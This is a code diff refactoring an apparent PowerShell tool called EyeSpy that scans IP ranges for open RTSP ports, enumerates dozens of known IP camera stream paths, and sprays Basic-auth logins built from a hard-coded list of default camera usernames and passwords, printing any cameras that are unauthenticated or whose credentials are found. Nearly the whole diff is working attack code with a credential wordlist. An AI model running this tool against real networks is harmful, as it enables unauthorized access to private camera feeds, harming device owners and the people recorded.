@@ -11,9 +11,6 @@ function EyeSpy {
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$PathScan,
 
-        #[Parameter(Mandatory = $False, ParameterSetName = 'Default')]
-        #[int]$Threads = 50,
-
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$Help
 
@@ -111,7 +108,7 @@ function Get-IpRange {
                     $IPInBinary = $IPInBinary -join ''
                     $HostBits = 32 - $SubnetBits
                     $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)
-                    $HostIDInBinary = '0' * $HostBits
+
                     $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                     For ($i = 1; $i -le $imax; $i++) {
                         $NextHostIDInDecimal = $i
@@ -137,157 +134,133 @@ function Get-IpRange {
             return $Computers
         }
 }
+
+#Function to generate b64 credentials for all known default/common username and password combinations
+function GenerateCreds {
+
+    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
+                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
+                )
+
+    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
+                "123", "1234", "12345", "123456", "1234567", "12345678",
+                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
+                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
+                "administrator", "Administrator", "aiphone", "camera",
+                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
+                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
+                "Pass", "password", "password123", "qwerty", "qwerty123",
+                "Recorder", "reolink", "root", "service", "supervisor",
+                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
+                "user", "wbox", "wbox123", "Y5eIMz3C"
+                )
+
+    $authString = @()
+
+                foreach ($user in $UserList){
+                    foreach ($pass in $PassList) {
+                    $authString += [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")) 
+                    }              
+                }
+
+    return $authString
+}
+
 #Function to check if a default/common RTSP port is open 554, 8554, 5554
 function PortScan {
-        [CmdletBinding(ConfirmImpact = 'None')]
-        Param(
-            [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
-            [string[]] $Target
-        ) 
+    [CmdletBinding(ConfirmImpact = 'None')]
+    Param(
+        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
+        [string[]] $Target
+    )
 
     $Ports = @(554, 8554, 5554)
     $Timeout = 300
+    $MaxThreads = 30  # Set the desired maximum number of threads
+    $ReturnedResult = @()
+
+    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
+    $runspacePool.Open()
+    $runspaces = New-Object System.Collections.ArrayList
 
     $scriptBlock = {
-        
         param ($Target, $Timeout, $Port)
-        
+
         $tcpClient = New-Object System.Net.Sockets.TcpClient
         $asyncResult = $tcpClient.BeginConnect($Target, $Port, $null, $null)
         $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
 
-            if ($wait) { 
-                try {
-                    $tcpClient.EndConnect($asyncResult)
-                    if ($tcpClient.Connected) {
-                        #Port Open
-                        $tcpClient.Close()
-                        return "$Target`:$Port"
-                    }
-                }
-                catch {
-                    #Errorhandling Catch
+        if ($wait) {
+            try {
+                $tcpClient.EndConnect($asyncResult)
+                if ($tcpClient.Connected) {
+                    #Port Open
                     $tcpClient.Close()
-                    return "Error with Connection"
+                    $tcpClient.Dispose()
+                    return "$Target`:$Port"
                 }
             }
-            else {
-                #Port Closed
+            catch {
+                #Errorhandling Catch
                 $tcpClient.Close()
+                $tcpClient.Dispose()
                 return "Error with Connection"
             }
         }
-
-        foreach ($Computer in $Target) {
-            foreach ($Port in $Ports){
-                $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Timeout).AddArgument($Port)
-                $runspace.RunspacePool = $runspacePool
-
-                [void]$runspaces.Add([PSCustomObject]@{
-                    Runspace     = $runspace
-                    Handle       = $runspace.BeginInvoke()
-                    ComputerName = $Computer
-                    Port         = $Port
-                    Completed    = $false
-                })
-            }   
+        else {
+            #Port Closed
+            $tcpClient.Close()
+            $tcpClient.Dispose()
+            return "Error with Connection"
         }
-        return $AlivePorts
-}
-#Function to use Async-Runtimes (Badly) and handle any results from other functions
-function Async-Runspaces {
-    [CmdletBinding(ConfirmImpact = 'None')]
-    Param(
-        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
-        [string[]] $Target,
-        [Parameter(Mandatory, ValueFromPipeline, Position = 1)]
-        [string[]] $Option
-
-    )   
-    
-    #Function Wide Variables  
-    $Threads = 30
-    $Timeout = 100
-    $ReturnedResult = @()
-    $Auth200 = $False
-    $NoAuth200 = $False
-
-    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
-    $runspacePool.Open()
-    $runspaces = New-Object System.Collections.ArrayList
-
-
-    #My Weird way of Calling the Scripts/Runtime blocks to be used in this function
-    if ($Option -eq "PortScan"){
-        PortScan -Target $Target
-    } elseif ($Option -eq "PathAttack" -or $Option -eq "FullPathAttack"){
-        PathAttack -Targets $Target
-    } elseif ($Option -eq "AuthAttack"){
-        AuthAttack -Targets $Target
     }
 
-    # Poll the runspaces and display results as they complete
+    foreach ($Computer in $Target) {
+        foreach ($Port in $Ports) {
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Timeout).AddArgument($Port)
+            $runspace.RunspacePool = $runspacePool
+
+            [void]$runspaces.Add([PSCustomObject]@{
+                Runspace     = $runspace
+                Handle       = $runspace.BeginInvoke()
+                ComputerName = $Computer
+                Port         = $Port
+                Completed    = $false
+            })
+        }
+    }
+
     do {
-        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed -and -not ($NoAuth200 -or $Auth200) }) {
+        $runspacesToStart = @($runspaces | Where-Object { -not $_.Completed -and -not $_.Handle.IsCompleted })
+        if ($runspacesToStart.Count -lt $MaxThreads) {
+            # Start new runspaces here
+        }
+
+        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
             if ($runspace.Handle.IsCompleted) {
-                
                 $runspace.Completed = $true
                 $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                 $runspace.Runspace.Dispose()
+
+                $runspaces.Remove($runspace)
                 $runspace.Handle.AsyncWaitHandle.Close()
 
-                if ($result -eq "Error with Connection"){
+                if ($result -eq "Error with Connection") {
                     continue
                 }
-                # Handling of the PortScan Results:
-                elseif($Option -eq "PortScan") {
+                else {
                     $ReturnedResult += $result
-
-                # Handling of the Path Attacking Results:
-                } elseif ($Option -eq "PathAttack" -or $Option -eq "FullPathAttack") {
-                    $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
-                    if ($result[3] -eq "200"){
-                        #Checking for No Authentication on all Paths
-                        Write-Host -ForegroundColor Green "No Authentication Required:" $concat
-                        if ($Option -eq "PathAttack"){$NoAuth200 = $True}
-                        
-                    } elseif ($result[3] -eq "401" -or $result[3] -eq "403") {
-                        #Find any 401's or 403's for Authentication BruteForcing
-                        $ReturnedResult += $concat
-                    
-                    } else {
-                        #Should catch and discard any other status codes including 404
-                        continue
-                    }
-
-                # Handling of the Credential Attacking Results:
-                } elseif ($Option -eq "AuthAttack") {
-                    $concat = $result[0] + ":"+ $result[1] + "/" + $result[2]
-                    $foundCreds = $result[4] + ":" + $result[5]
-                    if ($result[3] -eq "200"){
-                        #Basic Auth Credentials Found
-                        Write-Host -NoNewline -ForegroundColor Green "Credentials Found:" $concat 
-                        Write-Host " -> " $foundCreds
-                        $Auth200 = $True
-                    } else {
-                        #Should catch and discard any other status codes including 404
-                        continue
-                    }
-                    
                 }
             }
         }
 
-    Start-Sleep -Milliseconds 100
-    } while ($runspaces | Where-Object { -not $_.Completed -and -not ($NoAuth200 -or $Auth200) })
-    
-        # Clean up
-        $runspacePool.Close()
-        $runspacePool.Dispose()
-        return $ReturnedResult
+        Start-Sleep -Milliseconds 100
+    } while ($runspaces.Count -gt 0)
+
+    $runspacePool.Close()
+    $runspacePool.Dispose()
+    return $ReturnedResult
 }
-
-
 
 #Function outlines the Runtime Environments when Enumerating common IP Camera URL Paths
 function PathAttack {
@@ -295,10 +268,9 @@ function PathAttack {
     Param(
         [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
         [string[]] $Targets
-    ) 
+    )
 
-    #Variable for many common paths used by IP cameras
-    $Paths = @( "", "MyStream", "/live/ch01_0", "0/1:1/main", "0/video1", "1", "1.AMP", "1/h264major", "1/stream1",
+        $Paths = @( "", "MyStream", "/live/ch01_0", "0/1:1/main", "0/video1", "1", "1.AMP", "1/h264major", "1/stream1",
     "11", "12", "125", "1080p", "1440p", "480p", "4K", "666", "720p", "AVStream1_1", "CAM_ID.password.mp2",
     "CH001.sdp", "GetData.cgi", "HD", "HighResolutionVideo", "LowResolutionVideo", "MediaInput/h264",
     "MediaInput/mpeg4", "ONVIF/MediaInput", "StdCh1", "Streaming/Channels/1", "Streaming/Unicast/channels/101",
@@ -325,284 +297,375 @@ function PathAttack {
     "video.mp4", "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp", "video1+audio1",
     "videoMain", "videoinput_1/h264_1/media.stm", "videostream.asf", "vis", "wfov"
     )
-
     $Timeout = 300
+    $MaxThreads = 10  # Set the desired maximum number of threads
+    $ReturnedResult = @()
+
+    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
+    $runspacePool.Open()
+    $runspaces = New-Object System.Collections.ArrayList
 
     $scriptBlock = {
-        
         param ($IP, $Timeout, $Port, $Path)
 
-            $tcpClient = New-Object System.Net.Sockets.TcpClient
-            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
-            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
+        $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
 
-                if ($wait) { 
+        if ($wait) {
+            try {
+                $tcpClient.EndConnect($asyncResult)
+                if ($tcpClient.Connected) {
+                    #Port Open
+                    $Stream = $tcpClient.GetStream()
+                    $Reader = New-Object System.IO.StreamReader($Stream)
+                    $Reader.BaseStream.ReadTimeout = $Timeout
+                    $Writer = New-Object System.IO.StreamWriter($Stream)
+
+                    $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
+                    $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
+                               "CSeq: 2$CRLF$CRLF"
+
+                    $Writer.Write($request)
+                    $Writer.Flush()
+
+                    $response = ''
                     try {
-                        $tcpClient.EndConnect($asyncResult)
-                        if ($tcpClient.Connected) {
-                            #Port Open
-                            $Stream = $tcpClient.GetStream()
-                            $Reader = New-Object System.IO.StreamReader($Stream)
-                            $Reader.BaseStream.ReadTimeout = $Timeout
-                            $Writer = New-Object System.IO.StreamWriter($Stream)
-
-                            $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
-                            $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
-                                       "CSeq: 2$CRLF$CRLF"
-
-
-                            $Writer.Write($request)
-                            $Writer.Flush()
-
-                            $response = ''
-                            try {
-                                Start-Sleep -Milliseconds 100
-                                while ($Stream.CanRead) {
-                                        $line = $Reader.ReadLine()
-                                    if ($line -eq $null) { break }
-                                        $response += $line + $CRLF
-                                }
-                            } catch [System.IO.IOException] {
-                                # Catching the exception without taking any action
-            
-                                # Debugging: Handle timeout or connection closed gracefully
-                                #Write-Host "Error reading response: $_"
-                            }
-
-                            # Extract the status code from the first line
-                            $statusLine = $response.Split([Environment]::NewLine)[0]
-                            $statusCode = ($statusLine -split ' ')[1].Trim()
-
-                            $tcpClient.Close()
-                            return @($IP, $Port, $Path, $statusCode)
+                        Start-Sleep -Milliseconds 100
+                        while ($Stream.CanRead) {
+                            $line = $Reader.ReadLine()
+                            if ($null -eq $line) { break }
+                            $response += $line + $CRLF
                         }
+                    } catch [System.IO.IOException] {
+                        # Catching the exception without taking any action
                     }
-                    catch {
-                        #Errorhandling Catch
-                        Write-Host "Error Handling"
-                        $tcpClient.Close()
-                        return "Error with Connection"
-                    }
-                }
-                else {
-                    #Port Closed
-                    Write-Host "Port Closed"
+
+                    # Extract the status code from the first line
+                    $statusLine = $response.Split([Environment]::NewLine)[0]
+                    $statusCode = ($statusLine -split ' ')[1].Trim()
+
                     $tcpClient.Close()
-                    return "Error with Connection"
+                    $tcpClient.Dispose()
+                    $Reader.Dispose()
+                    $Writer.Dispose()
+                    $Stream.Dispose()
+
+                    return @($IP, $Port, $Path, $statusCode)
                 }
             }
-        
-        foreach ($Target in $Targets) {
+            catch {
+                #Errorhandling Catch
+                $tcpClient.Close()
+                $tcpClient.Dispose()
+                return "Error with Connection"
+            }
+        }
+        else {
+            #Port Closed
+            $tcpClient.Close()
+            $tcpClient.Dispose()
+            return "Error with Connection"
+        }
+    }
 
-            $IP = ($Target -split ':')[0]
-            [int]$Port = ($Target -split ':')[1]
+    foreach ($Target in $Targets) {
+        $IP = ($Target -split ':')[0]
+        [int]$Port = ($Target -split ':')[1]
 
-            foreach ($Path in $Paths) {
-                $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path)
-                $runspace.RunspacePool = $runspacePool
-                  
-                [void]$runspaces.Add([PSCustomObject]@{
-                    Runspace     = $runspace
-                    Handle       = $runspace.BeginInvoke()
-                    ComputerName = $IP
-                    Port         = $Port
-                    Path         = $Path
-                    Completed    = $false
-                })
-            }   
+        foreach ($Path in $Paths) {
+            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path)
+            $runspace.RunspacePool = $runspacePool
+
+            [void]$runspaces.Add([PSCustomObject]@{
+                Runspace     = $runspace
+                Handle       = $runspace.BeginInvoke()
+                ComputerName = $IP
+                Port         = $Port
+                Path         = $Path
+                Completed    = $false
+            })
+        }
+    }
+
+    do {
+        $runspacesToStart = @($runspaces | Where-Object { -not $_.Completed -and -not $_.Handle.IsCompleted })
+        if ($runspacesToStart.Count -lt $MaxThreads) {
+            # Start new runspaces here
         }
 
+        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+            if ($runspace.Handle.IsCompleted) {
+                $runspace.Completed = $true
+                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+                $runspace.Runspace.Dispose()
 
+                $runspaces.Remove($runspace)
+                $runspace.Handle.AsyncWaitHandle.Close()
 
+                if ($result -eq "Error with Connection") {
+                    continue
+                }
+                else {
+                    if ($result[3] -eq "200") {
+                        $concat = $result[0] + ":" + $result[1] + "/" + $result[2]
+                        # Checking for No Authentication on all Paths
+                        Write-Host -ForegroundColor Green "No Authentication Required: $concat"
+                        break
+                    }
+                    elseif ($result[3] -eq "401" -or $result[3] -eq "403") {
+                        $concat = $result[0] + ":" + $result[1] + "/" + $result[2]
+                        # Find any 401's or 403's for Authentication BruteForcing
+                        $ReturnedResult += $concat
+                        continue
+                    }
+                    else {
+                        # Should catch and discard any other status codes including 404
+                        continue
+                    }
+                }
+            }
+        }
+
+        Start-Sleep -Milliseconds 100
+    } while ($runspaces.Count -gt 0)
+
+    $runspacePool.Close()
+    $runspacePool.Dispose()
+    return $ReturnedResult
 }
+
 #Function outlines the Runtime Environments when Attempting to Spray Common IP Camera Credentials
 function AuthAttack {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
         [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
         [string[]] $Targets
-    ) 
+    )
 
-    $UserList = @("Admin", "admin", "admin1", "administrator", "Administrator",
-                "aiphone", "root", "Root", "service", "supervisor", "ubnt"
-                )
-
-    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
-                "123", "1234", "12345", "123456", "1234567", "12345678",
-                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
-                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
-                "administrator", "Administrator", "aiphone", "camera",
-                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
-                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
-                "Pass", "password", "password123", "qwerty", "qwerty123",
-                "Recorder", "reolink", "root", "service", "supervisor",
-                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
-                "user", "wbox", "wbox123", "Y5eIMz3C"
-                )
+    [array]$creds = GenerateCreds
 
     $Timeout = 100
+    $MaxThreads = 10  # Set the desired maximum number of threads
+    $ReturnedResult = @()
+
+    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads)
+    $runspacePool.Open()
+    $runspaces = New-Object System.Collections.ArrayList
 
     $scriptBlock = {
-        
-        param ($IP, $Timeout, $Port, $Path, $authString, $Username, $Password)
+        param ($IP, $Timeout, $Port, $Path, $cred, $SuccessFlag)
 
-            $tcpClient = New-Object System.Net.Sockets.TcpClient
-            $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
-            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
+        $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
 
-                if ($wait) { 
+        if ($wait) {
+            try {
+                $tcpClient.EndConnect($asyncResult)
+                if ($tcpClient.Connected) {
+                    # Port Open
+                    $Stream = $tcpClient.GetStream()
+                    $Reader = New-Object System.IO.StreamReader($Stream)
+                    $Reader.BaseStream.ReadTimeout = $Timeout
+                    $Writer = New-Object System.IO.StreamWriter($Stream)
+
+                    $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
+                    $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
+                               "CSeq: 2$CRLF" +
+                               "Authorization: Basic $cred$CRLF$CRLF"
+
+                    $Writer.Write($request)
+                    $Writer.Flush()
+
+                    $response = ''
                     try {
-                        $tcpClient.EndConnect($asyncResult)
-                        if ($tcpClient.Connected) {
-                            #Port Open
-                            $Stream = $tcpClient.GetStream()
-                            $Reader = New-Object System.IO.StreamReader($Stream)
-                            $Reader.BaseStream.ReadTimeout = $Timeout
-                            $Writer = New-Object System.IO.StreamWriter($Stream)
-
-                            $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
-                            $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
-                                       "CSeq: 2$CRLF" +
-                                       "Authorization: Basic $authString$CRLF$CRLF"
-
-                            $Writer.Write($request)
-                            $Writer.Flush()
-
-                            $response = ''
-                            try {
-                                Start-Sleep -Milliseconds 100
-                                while ($Stream.CanRead) {
-                                        $line = $Reader.ReadLine()
-                                    if ($line -eq $null) { break }
-                                        $response += $line + $CRLF
-                                }
-                            } catch [System.IO.IOException] {
-                                # Catching the exception without taking any action
-            
-                                # Debugging: Handle timeout or connection closed gracefully
-                                #Write-Host "Error reading response: $_"
-                            }
-
-                            #Debugging Line:
-                            # Extract the status code from the first line
-                            $statusLine = $response.Split([Environment]::NewLine)[0]
-                            $statusCode = ($statusLine -split ' ')[1].Trim()
-
-                            $tcpClient.Close()
-                            return @($IP, $Port, $Path, $statusCode, $Username, $Password)
+                        Start-Sleep -Milliseconds 100
+                        while ($Stream.CanRead) {
+                            $line = $Reader.ReadLine()
+                            if ($null -eq $line) { break }
+                            $response += $line + $CRLF
                         }
+                    } catch [System.IO.IOException] {
+                        # Catching the exception without taking any action
                     }
-                    catch {
-                        #Errorhandling Catch
-                        Write-Host "Error Handling"
-                        $tcpClient.Close()
-                        return "Error with Connection"
-                    }
-                }
-                else {
-                    #Port Closed
-                    Write-Host "Port Closed"
+
+                    # Extract the status code from the first line
+                    $statusLine = $response.Split([Environment]::NewLine)[0]
+                    $statusCode = ($statusLine -split ' ')[1].Trim()
+
                     $tcpClient.Close()
-                    return "Error with Connection"
+                    $tcpClient.Dispose()
+                    $Reader.Dispose()
+                    $Writer.Dispose()
+                    $Stream.Dispose()
+
+                    return @($IP, $Port, $Path, $statusCode, $cred)
                 }
             }
-        
-        foreach ($Target in $Targets) {
+            catch {
+                # Errorhandling Catch
+                $tcpClient.Close()
+                $tcpClient.Dispose()
+                return "Error with Connection"
+            }
+        }
+        else {
+            # Port Closed
+            $tcpClient.Close()
+            $tcpClient.Dispose()
+            return "Error with Connection"
+        }
+    }
+    
+    $successFound = $false  # Flag to track if successful result is found
 
-            $IP, $Port, $Paths = $Target -split "[:/]", 3
+    foreach ($Target in $Targets) {
+        $IP, $Port, $Paths = $Target -split "[:/]", 3
 
-            foreach ($Path in $Paths) {
-                foreach($Username in $UserList){
-                    foreach($Password in $PassList){
-                        $authString = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$Username`:$Password"))
-                        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($authString).AddArgument($Username).AddArgument($Password)
+        foreach ($Path in $Paths) {
+            foreach ($cred in $creds) {
+                    if (!$successFound) {
+                        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($cred).AddArgument([ref]$successFound)
                         $runspace.RunspacePool = $runspacePool
-                  
+
                         [void]$runspaces.Add([PSCustomObject]@{
                             Runspace     = $runspace
                             Handle       = $runspace.BeginInvoke()
-                            Auth         = $authString
-                            Username     = $Username
-                            Password     = $Password
+                            Creds        = $cred
                             ComputerName = $IP
                             Port         = $Port
                             Path         = $Path
                             Completed    = $false
                         })
                     }
-                }
-            }   
+                
+            }
+        }
+    }
+
+    do {
+        $runspacesToStart = @($runspaces | Where-Object { -not $_.Completed -and -not $_.Handle.IsCompleted })
+        if ($runspacesToStart.Count -gt 0) {
+            # Wait for a runspace to complete before starting new ones
+            $runspace = $runspacesToStart[0]
+            $runspace.Handle.AsyncWaitHandle.WaitOne() | Out-Null
         }
 
+        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+            if ($runspace.Handle.IsCompleted) {
+                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+                $runspace.Runspace.Dispose()
+                $runspace.Completed = $true
+                $runspace.Handle.AsyncWaitHandle.Close()
 
+                if ($result -eq "Error with Connection") {
+                    continue
+                }
+                elseif ($result[3] -eq "200") {
+                    $concat = $result[0] + ":" + $result[1] + "/" + $result[2]
+                    #$foundCreds = $result[4]
+                    $foundCreds = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($result[4]))
+                    # Basic Auth Credentials Found
+                    Write-Host -NoNewline -ForegroundColor Green "Credentials Found: $concat -> "
+                    Write-Host "$foundCreds"
+                    $successFound = $true  # Set flag to true if successful result is found
+                    break
+                }
+                else {
+                    # Should catch and discard any other status codes including 404
+                    continue
+                }
+            }
+        }
 
+        Start-Sleep -Milliseconds 100
+    } while ($runspaces.Count -gt 0 -and !$successFound)
+
+    # Close and dispose of all existing runspaces
+    foreach ($runspace in $runspaces) {
+        if (-not $runspace.Completed) {
+            $runspace.Runspace.Dispose()
+            $runspace.Handle.AsyncWaitHandle.Close()
+        }
+    }
+
+    $runspacePool.Close()
+    $runspacePool.Dispose()
+    return $ReturnedResult
 }
+
+
 
 [array]$AlivePorts = @()
 
+if ($Scan) {
+    $IpAddr = Get-IpRange -Target $Scan
+    $AlivePorts += PortScan -Target $IpAddr
 
-    if ($Scan){
-
-        $IpAddr = Get-IpRange -Target $Scan
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
-    
-        if ($AlivePorts.Length -eq 0){  
-            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
-            return
-        } else {
-            Write-Host "Open RTSP Ports Found:"
-            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")
-            }
-        return
-        }
-
-    if ($PathScan){
-        $IpAddr = Get-IpRange -Target $PathScan
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
-
-        if ($AlivePorts){ 
-            Write-Host "Open RTSP Ports Found:"
-            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
-            Write-Host "Spraying Paths:"
-            Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "PathAttack"
-
-            if ($PathsToAttack){
-                #Print the Possible Paths to the Host
-                Write-Host -ForegroundColor Yellow ($PathsToAttack -join "`n")"`n"
-            } else {
-                Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
-            }
-        } else {
-            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
-            Write-Host $AlivePorts
-        }
+    if ($AlivePorts.Length -eq 0) {
+        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
         return
     }
-
-
-    if ($FullAuto){
-        $IpAddr = Get-IpRange -Target $FullAuto
-        $AlivePorts += Async-Runspaces -Target $IpAddr -Option "PortScan"
-
-        if ($AlivePorts){ 
-            Write-Host "Open RTSP Ports Found:"
-            Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
-            Write-Host "Spraying Paths and Credentials:"
-            Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "FullPathAttack"
-            if ($PathsToAttack){
-                #Run the AuthAttack function
-                Async-Runspaces -Target $PathsToAttack -Option "AuthAttack"
-            } else {
-                Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
-            }
-
-        } else {
-            Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
-            Write-Host $AlivePorts
-        }
-        return
+    else {
+        Write-Host "Open RTSP Ports Found:"
+        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")
     }
+    return
+}
+
+if ($PathScan) {
+    $IpAddr = Get-IpRange -Target $PathScan
+    $AlivePorts += PortScan -Target $IpAddr
+
+    if ($AlivePorts) {
+        Write-Host "Open RTSP Ports Found:"
+        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
+        Write-Host "Spraying Paths:"
+        Start-Sleep -Milliseconds 500
+        $PathsToAttack = PathAttack -Targets $AlivePorts
+
+        if ($PathsToAttack) {
+            # Print the Possible Paths to the Host
+            Write-Host -ForegroundColor Yellow ($PathsToAttack -join "`n")"`n"
+
+        }
+        else {
+            Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
+        }
+    }
+    else {
+        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
+        Write-Host $AlivePorts
+    }
+    return
+}
+
+if ($FullAuto) {
+    $IpAddr = Get-IpRange -Target $FullAuto
+    $AlivePorts += PortScan -Target $IpAddr
+
+    if ($AlivePorts) {
+        Write-Host "Open RTSP Ports Found:"
+        Write-Host -ForegroundColor Green ($AlivePorts -join "`n")"`n"
+        Write-Host "Spraying Paths and Credentials:"
+        Start-Sleep -Milliseconds 500
+        $PathsToAttack = PathAttack -Targets $AlivePorts
+
+        if ($PathsToAttack) {
+            # Run the AuthAttack function
+            AuthAttack -Targets $PathsToAttack
+        }
+        else {
+            Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
+        }
+    }
+    else {
+        Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
+        Write-Host $AlivePorts
+    }
+    return
+}
 
 }
+#EyeSpy -FullAuto 192.168.0.219
